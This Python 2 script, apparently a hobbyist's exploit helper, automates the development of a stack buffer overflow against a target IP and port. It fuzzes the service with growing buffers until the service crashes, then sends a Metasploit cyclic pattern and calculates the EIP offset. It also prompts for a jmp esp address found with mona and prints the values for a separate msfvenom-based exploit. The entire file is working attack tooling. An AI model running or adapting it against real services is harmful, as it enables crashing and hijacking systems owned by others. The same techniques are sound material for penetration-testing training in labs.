import argparse, socket, sys, commands, time

#Please steal this and make it better. I have no idea what I'm doing.
parser = argparse.ArgumentParser()
parser.add_argument("-t","--target",type=str,metavar="",help="Target IP address")
parser.add_argument("-p","--port", type=int, metavar="",help="Target port")
parser.add_argument("--version", action="version", version="%(prog)s 0.1(I'm really winging this)")
input = parser.parse_args()

if (len(sys.argv) < 4):
	parser.print_help()
	sys.exit(0)

bof = ""
jmpesp = ""
buffer=["A"]
counter = 100
while len(buffer) <= 30:
	buffer.append("A"*counter)
	counter += 200
print "#############################"
print "#  PERFORM INITIAL FUZZING  #"
print "#############################"
for string in buffer:
	try:
		print "Fuzzing " + input.target + " with %s bytes" % len(string)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(3.0)
		connect = s.connect((input.target, input.port))
		s.recv(1024)
		s.send("" + string)
		s.close()
	except socket.timeout:
		print "Program crashed at %s bytes" % len(string)
		bof = len(string)
		break

print "#############################"
print "# CALLING ON PATTERN_CREATE #"
print "#############################"
#Call on pattern_create.rb
pattern_create = commands.getoutput("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %s " % bof)
print "Please restart the crashed app before continuing"
raw_input("Press Enter to continue...")
try:
	print "Fuzzing " + input.target + " with our pattern_create payload of %s bytes!" % len(pattern_create)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(3.0)
	connect = s.connect((input.target,input.port))
	s.recv(1024)
	s.send("" + pattern_create)
	s.close()
except socket.timeout:
	print "I think you forgot to restart the application"
	sys.exit(0)	
print "Program has crashed! Please note the value of the EIP register."
eip = raw_input("Enter the EIP now: ")
print "##############################"
print "#     CALCULATING OFFSET     #"
print "##############################"
offset = commands.getoutput("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l %(1)s -q %(2)s | cut -d \" \" -f 6" % {"1" : bof, "2" : eip})

print "##############################"
print "#  LOCATE VULNERABLE MODULE  #"
print "##############################"
print "Use '!mona modules' to search for a module without DEP or ASLR"
print "and that has a memory range that doesn't contain bad characters"
raw_input("Press enter to continue...")
print "##############################"
print "#  FIND JMP ESP INSTRUCTION  #"
print "##############################"
print "Use '!mona find -s \"\\xff\\xe4\" -m MODULENAME'"
print "to locate the jmp esp instruction we need to trigger"
print "our payload."
jmpesp = raw_input("Enter the jmp esp address in little endian: ")

#Format the address to \x hex format
jmpesp = jmpesp[:0] + '\\x' + jmpesp[0:]
jmpesp = jmpesp[:4] + '\\x' + jmpesp[4:]
jmpesp = jmpesp[:8] + '\\x' + jmpesp[8:]
jmpesp = jmpesp[:12] + '\\x' + jmpesp[12:]

print "###############################"
print "#     SCRIPT IS FINISHED!     #"
print "###############################"
print "Run the msfvenom command and replace the variables in fuzzsploit.py with the following: "
print "[*] offset = %s" % offset
print "[*] jmpesp = %s" % jmpesp
